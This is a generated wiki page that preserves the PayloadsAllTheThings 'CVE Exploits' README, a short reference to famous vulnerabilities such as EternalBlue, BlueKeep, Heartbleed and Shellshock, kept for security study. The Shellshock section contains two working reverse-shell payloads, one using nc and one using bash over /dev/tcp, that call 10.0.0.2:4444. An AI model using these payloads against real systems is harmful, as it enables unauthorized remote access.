---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Common Vulnerabilities and Exposures

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-cve-exploits-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CVE Exploits/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Common Vulnerabilities and Exposures](../../topics/cve-exploits/common-vulnerabilities-and-exposures.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-cve-exploits-readme |
| name | Common Vulnerabilities and Exposures |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/README.md |

## Preserved Source Material

````yaml
_body: "# Common Vulnerabilities and Exposures\n\n> A CVE (Common Vulnerabilities and Exposures) is a unique identifier assigned\
  \ to a publicly known cybersecurity vulnerability. CVEs help standardize the naming and tracking of vulnerabilities, making\
  \ it easier for organizations, security professionals, and software vendors to share information and manage risks associated\
  \ with these vulnerabilities. Each CVE entry includes a brief description of the vulnerability, its potential impact, and\
  \ details about affected software or systems.\n\n## Summary\n\n* [Tools](#tools)\n* [Big CVEs in the last 15 years](#big-cves-in-the-last-15-years)\n\
  \    * [CVE-2017-0144 - EternalBlue](#cve-2017-0144---eternalblue)\n    * [CVE-2017-5638 - Apache Struts 2](#cve-2017-5638---apache-struts-2)\n\
  \    * [CVE-2018-7600 - Drupalgeddon 2](#cve-2018-7600---drupalgeddon-2)\n    * [CVE-2019-0708 - BlueKeep](#cve-2019-0708---bluekeep)\n\
  \    * [CVE-2019-19781 - Citrix ADC Netscaler](#cve-2019-19781---citrix-adc-netscaler)\n    * [CVE-2014-0160 - Heartbleed](#cve-2014-0160---heartbleed)\n\
  \    * [CVE-2014-6271 - Shellshock](#cve-2014-6271---shellshock)\n* [References](#references)\n\n## Tools\n\n* [Trickest\
  \ CVE Repository - Automated collection of CVEs and PoC's](https://github.com/trickest/cve)\n* [Nuclei Templates - Community\
  \ curated list of templates for the nuclei engine to find security vulnerabilities in applications](https://github.com/projectdiscovery/nuclei-templates)\n\
  * [Metasploit Framework](https://github.com/rapid7/metasploit-framework)\n* [CVE Details - The ultimate security vulnerability\
  \ datasource](https://www.cvedetails.com)\n\n## Big CVEs in the last 15 years\n\n### CVE-2017-0144 - EternalBlue\n\nEternalBlue\
  \ exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. The vulnerability exists\
  \ because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets\
  \ from remote attackers, allowing them to execute arbitrary code on the target computer.\n\nAfftected systems:\n\n* Windows\
  \ Vista SP2\n* Windows Server 2008 SP2 and R2 SP1\n* Windows 7 SP1\n* Windows 8.1\n* Windows Server 2012 Gold and R2\n*\
  \ Windows RT 8.1\n* Windows 10 Gold, 1511, and 1607\n* Windows Server 2016\n\n### CVE-2017-5638 - Apache Struts 2\n\nOn\
  \ March 6th, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This recent vulnerability,\
  \ CVE-2017-5638, allows a remote attacker to inject operating system commands into a web application through the \"Content-Type\"\
  \ header.\n\n### CVE-2018-7600 - Drupalgeddon 2\n\nA remote code execution vulnerability exists within multiple subsystems\
  \ of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could\
  \ result in the site being completely compromised.\n\n### CVE-2019-0708 - BlueKeep\n\nA remote code execution vulnerability\
  \ exists in Remote Desktop Services – formerly known as Terminal Services – when an unauthenticated attacker connects to\
  \ the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires\
  \ no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target\
  \ system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.\n\
  \n### CVE-2019-19781 - Citrix ADC Netscaler\n\nA remote code execution vulnerability in Citrix Application Delivery Controller\
  \ (ADC) formerly known as NetScaler ADC and Citrix Gateway formerly known as NetScaler Gateway that, if exploited, could\
  \ allow an unauthenticated attacker to perform arbitrary code execution.\n\nAffected products:\n\n* Citrix ADC and Citrix\
  \ Gateway version 13.0 all supported builds\n* Citrix ADC and NetScaler Gateway version 12.1 all supported builds\n* Citrix\
  \ ADC and NetScaler Gateway version 12.0 all supported builds\n* Citrix ADC and NetScaler Gateway version 11.1 all supported\
  \ builds\n* Citrix NetScaler ADC and NetScaler Gateway version 10.5 all supported builds\n\n### CVE-2014-0160 - Heartbleed\n\
  \nThe Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows\
  \ stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS\
  \ provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM)\
  \ and some virtual private networks (VPNs).\n\n### CVE-2014-6271 - Shellshock\n\nShellshock, also known as Bashdoor is a\
  \ family of security bug in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many\
  \ Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker\
  \ to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access\
  \ to a computer system.\n\n```powershell\necho -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc\
  \ 10.0.0.2 4444 -e /bin/sh\\r\\n\"\ncurl --silent -k -H \"User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444\
  \ 0>&1\" \"https://10.0.0.1/cgi-bin/admin.cgi\" \n```\n\n## References\n\n* [The Heartbleed Bug - Heartbleed - April 7,\
  \ 2014](https://web.archive.org/web/20260302163556/https://heartbleed.com/)\n* [Shellshock (software bug) - Wikipedia -\
  \ September 29, 2014](https://web.archive.org/web/20140929214920/http://en.wikipedia.org:80/wiki/Shellshock_(software_bug))\n\
  * [Apache Struts Equifax Hack Analysis Part 1: CVE-2017-5638 - Imperva - March 9, 2017](https://web.archive.org/web/20180305002332/https://www.imperva.com/blog/2017/03/cve-2017-5638-new-remote-code-execution-rce-vulnerability-in-apache-struts-2/)\n\
  * [EternalBlue - Wikipedia - March 4, 2026](https://web.archive.org/web/20260304111336/https://en.wikipedia.org/wiki/EternalBlue)\n\
  * [CVE-2019-0708 | Remote Desktop Services Remote Code Execution Vulnerability - Microsoft - November 4, 2020](https://web.archive.org/web/20201104070840/https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708)"
_relative_path: CVE Exploits/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CVE Exploits/README.md
````
